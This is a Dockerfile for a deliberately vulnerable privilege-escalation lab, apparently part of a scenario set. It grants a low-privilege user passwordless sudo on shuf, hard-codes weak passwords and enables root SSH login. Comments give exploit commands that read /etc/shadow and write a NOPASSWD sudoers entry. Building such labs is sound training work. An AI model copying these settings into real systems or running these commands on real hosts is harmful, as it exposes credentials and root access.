FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_shuf
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/shuf as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and coreutils (which provides shuf)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        coreutils \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify shuf is installed
RUN which shuf && ls -la /usr/bin/shuf

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# shuf can read arbitrary files when run as root. The exploit approach:
#   sudo shuf -z /etc/shadow
# This outputs the contents of any file readable by root.
# An attacker can read /etc/shadow to crack root password, or read SSH keys,
# or use shuf's -o option to write to arbitrary files, enabling full compromise
# by overwriting /etc/passwd or /etc/sudoers with attacker-controlled content.
# Example full exploit:
#   1. Read /etc/passwd: sudo shuf -z /etc/passwd
#   2. Create modified passwd with root shell entry
#   3. Write it back: echo "..." | sudo shuf -z -o /etc/passwd -
#   Or use: LFILE=/etc/sudoers.d/escalate; echo "lowpriv ALL=(ALL) NOPASSWD: ALL" | sudo shuf -z -o "$LFILE" -
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/shuf" > /etc/sudoers.d/shuf && \
    chmod 440 /etc/sudoers.d/shuf

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]